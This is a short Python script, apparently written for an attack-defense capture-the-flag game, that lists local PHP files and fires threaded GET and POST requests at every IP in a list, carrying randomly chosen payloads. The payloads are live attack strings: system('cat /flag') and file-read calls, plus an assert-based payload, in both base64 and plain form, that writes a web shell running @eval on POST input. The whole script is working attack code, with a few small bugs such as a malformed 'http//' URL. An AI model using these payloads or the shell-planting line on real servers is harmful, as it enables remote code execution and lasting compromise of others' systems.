# -*-coding:utf-8
# By Virtua1

import requests
import random
import re
import os
import threading

def get_path():
	php_list=[]
	for root,dirs,files in os.walk('./'):
		for f in files:
			if f[-4:] == '.php':
				tmp = (root+"/"+f).replace('\\','/')
				tmp = tmp.replace('//','/')
				php_list.append(tmp)
	return php_list


def rand_payload():
	payloads = ['system("cat /flag");', 'a=system&b=cat /flag', 'a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};', 'a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))};', 'a=assert&b=${fputs(fopen(c.php,w),<?php @eval($_POST[b47a1654c768fa46845e9822c33d5fe9]); ?>1)};', '%73%79%73%74%65%6d%28%22%63%61%74%20%2f%66%6c%61%67%22%29%3b', 'system%28%22cat%20%2fflag%22%29%3b','getflag','"cat /flag;"','echo file_get_contents("/flag");','var_dump(file_get_contents("/flag"));','give_me_flag()']
	payload = payloads[random.randint(0,len(payloads)-1)]
	return payload

php_list=get_path()
def fake_request(ip):
	global php_list
	path = php_list[random.randint(0,len(php_list))-1][1:]
	payload = rand_payload()
	num = random.randint(1,2)
	if num == 1:
		url = 'http://'+ip+path+'/?pass='+payload
		try:
			resp = requests.get(url)
		except:
			pass

	if num == 2:
		data = {
				'cmd': payload
		}
		url = 'http//'+ip+path+'/'
		try:
			resp = requests.post(url,data=data)
		except:
			pass


ips = open('ip.txt','r').readlines()
for ip in ips:
	send = threading.Thread(target=fake_request,args=[ip])
	send.start()









